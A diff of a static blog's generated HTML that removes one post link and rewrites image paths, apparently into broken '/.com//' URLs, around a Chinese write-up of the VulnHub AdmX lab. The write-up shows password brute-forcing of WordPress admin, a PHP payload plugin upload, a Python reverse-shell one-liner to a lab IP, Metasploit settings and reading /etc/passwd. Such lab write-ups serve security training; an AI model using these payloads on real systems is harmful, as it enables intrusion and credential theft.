@@ -76,7 +76,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(90)</small>
+                <small>(89)</small>
             
         </div>
     </li>
@@ -579,7 +579,7 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="90">
+<input type="hidden" id="yelog_site_posts_number" value="89">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -641,15 +641,6 @@
            data-author="" >
             <span class="post-title" title="对中国整个安全行业的理解">对中国整个安全行业的理解</span>
             <span class="post-date" title="2023-06-14 16:06:36">2023/06/14</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2024/06/20/hello-world/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="Hello World">Hello World</span>
-            <span class="post-date" title="2024-06-20 14:35:01">2024/06/20</span>
         </a>
         
         
@@ -1526,17 +1517,17 @@
 <p>stty rows 38 columns 116</p>
 <p>reset</p>
 <p>涉及攻击方法:</p>
-<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C1.png"></p>
+<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C1.png"></p>
 <h1 id="WEB路径爆破"><a href="#WEB路径爆破" class="headerlink" title="WEB路径爆破"></a>WEB路径爆破</h1><p>diresearch -u <a target="_blank" rel="noopener" href="http://192.168.110.144/">http://192.168.110.144</a></p>
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C2.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C2.png"></p>
 <p>diresearch -u <a target="_blank" rel="noopener" href="http://192.168.110.144/wordpress">http://192.168.110.144/wordpress</a> </p>
 <h1 id="BurpSuite内容替换"><a href="#BurpSuite内容替换" class="headerlink" title="BurpSuite内容替换"></a>BurpSuite内容替换</h1><p>通过 <code>burpsuite</code>抓包我们可以发现当访问 <code>/wordpress</code>的时候该网页会自动的向 <code>192.168.159.145</code>请求三个 <code>js</code>文件，通过 <code>burpsuite</code>的回包分析，我们有是可以很明显的这个<code>ip</code>是直接写入到响应代码中的。</p>
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C3.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C3.png"></p>
 <p>们可以猜测这个 <code>ip</code>是靶机设计的时候的原本 <code>ip</code>。我们通过 <code>burpsuite</code>的 <code>Match and replace rules</code>功能自动的帮我们更改 <code>respnse</code>包中的<code>ip</code>内容为当前靶机的 <code>ip:1.0.0.4</code>，可以发现网页成功的渲染。但是当我们点击网页的每个连接发现都是没有任何反应的，而且再去复看网页源码也是一无所获。</p>
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C4.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C4.png"></p>
 <p>之后网站输入 <a target="_blank" rel="noopener" href="http://192.168.110.144/wordpress/wp-admin%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%98%AF%E7%99%BB%E5%BD%95%E6%A1%86">http://192.168.110.144/wordpress/wp-admin，可以看到是登录框</a></p>
 <h1 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h1><p>首先wordpress默认账号为admin，利用bp爆破</p>
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C5.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C5.png"></p>
 <p>adam14</p>
 <p>MSF漏洞利用</p>
 <h2 id="上传插件"><a href="#上传插件" class="headerlink" title="上传插件"></a>上传插件</h2><p>写好之后压缩</p>
@@ -1544,26 +1535,26 @@
 
 <p>vim payload.php</p>
 <p>zip payload.zip payload.php</p>
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C6.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C6.png"></p>
 <p>多试几下python环境，发现存在python3</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.110.144/wordpress/wp-conetn/plugins/exp.php?cmd=which python3</span><br></pre></td></tr></table></figure>
 
 <p>ok 用一下 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.110.141&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C7.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C7.png"></p>
 <p>成功拿到shell</p>
 <h1 id="方法二-通过msf"><a href="#方法二-通过msf" class="headerlink" title="方法二 通过msf"></a>方法二 通过msf</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">search wordpress admin</span><br><span class="line"></span><br><span class="line">use 2 </span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C8.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C8.png"></p>
 <p>show options配一下参数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set PASSWORD adam14</span><br><span class="line">set RHOSTS 192.168.110.144</span><br><span class="line">set USERNAME admin</span><br><span class="line">set TARGETURI /wordpress</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C9.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C9.png"></p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>首先查看 cat  &#x2F;etc&#x2F;passwd</p>
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C11.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C11.png"></p>
 <p>查看wordpress配置文件  有数据库的账号和密码</p>
-<p><img src="/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C12.png"></p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-AdmX-new%5C12.png"></p>
 <p>企业应用管理员 习惯用密码复用</p>
 <p>尝试 登录数据库 失败</p>
 <p>尝试登陆 wpadmin 密码为 adam14</p>
